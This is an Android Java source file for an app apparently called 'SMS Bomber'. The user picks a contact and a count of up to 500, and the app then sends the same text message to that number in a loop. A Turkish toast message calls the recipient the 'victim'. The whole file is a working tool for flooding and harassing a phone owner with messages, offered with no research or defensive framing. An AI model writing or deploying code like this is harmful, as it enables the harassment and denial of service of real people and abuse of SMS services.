package com.bigapps.doga.smsbomber.smsbomber;

import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.EditText;
import android.widget.NumberPicker;
import android.widget.TextView;
import android.widget.Toast;

import info.hoang8f.widget.FButton;

public class MainActivity extends AppCompatActivity {
    static final int PICK_CONTACT_REQUEST = 1;
    static int adet;
    TextView kisi_tv;
    private String numara;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        kisi_tv = (TextView)findViewById(R.id.contact_tv);
        final EditText mesaj_et = (EditText)findViewById(R.id.mesaj_et);

        final NumberPicker np=
                (NumberPicker) findViewById(R.id.numberPicker);
        np.setMaxValue(500);
        np.setMinValue(1);

        np.setOnValueChangedListener(new NumberPicker.OnValueChangeListener() {
            @Override
            public void onValueChange(NumberPicker picker, int oldVal, int newVal) {
                adet = np.getValue();
            }
        });



        FButton kisisec = (FButton) findViewById(R.id.kisisec_btn);
        FButton bombala = (FButton) findViewById(R.id.bombala_btn);

        kisisec.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent pickContactIntent = new Intent(Intent.ACTION_PICK, Uri.parse("content://contacts"));
                pickContactIntent.setType(ContactsContract.CommonDataKinds.Phone.CONTENT_TYPE); // Show user only contacts w/ phone numbers
                startActivityForResult(pickContactIntent,PICK_CONTACT_REQUEST);
            }
        });

        bombala.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                SmsManager smsManager = SmsManager.getDefault();
                for(int i = 0; i< adet; i++){
                    smsManager.sendTextMessage(numara, null, mesaj_et.getText().toString(), null, null);
                }
                Toast.makeText(getApplicationContext(),"Bombalanıyor! Kurbanın geri dönmesini bekleyin :)))",Toast.LENGTH_SHORT).show();
            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        // Check which request it is that we're responding to
        if (requestCode == PICK_CONTACT_REQUEST) {
            // Make sure the request was successful
            if (resultCode == RESULT_OK) {
                // Get the URI that points to the selected contact
                Uri contactUri = data.getData();
                // We only need the NUMBER column, because there will be only one row in the result
                String[] projection = {ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME};
                String[] projection2 = {ContactsContract.CommonDataKinds.Phone.NUMBER};

                // Perform the query on the contact to get the NUMBER column
                // We don't need a selection or sort order (there's only one result for the given URI)
                // CAUTION: The query() method should be called from a separate thread to avoid blocking
                // your app's UI thread. (For simplicity of the sample, this code doesn't do that.)
                // Consider using CursorLoader to perform the query.
                Cursor cursor = getContentResolver()
                        .query(contactUri, projection, null, null, null);
                cursor.moveToFirst();

                Cursor cursor2 = getContentResolver()
                        .query(contactUri, projection2, null, null, null);
                cursor2.moveToFirst();

                // Retrieve the phone number from the NUMBER column
                int column = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int column2 = cursor2.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                String name = cursor.getString(column);
                numara = cursor2.getString(column2);

                kisi_tv.setVisibility(View.VISIBLE);
                kisi_tv.setText(name);
            }
        }
    }
}
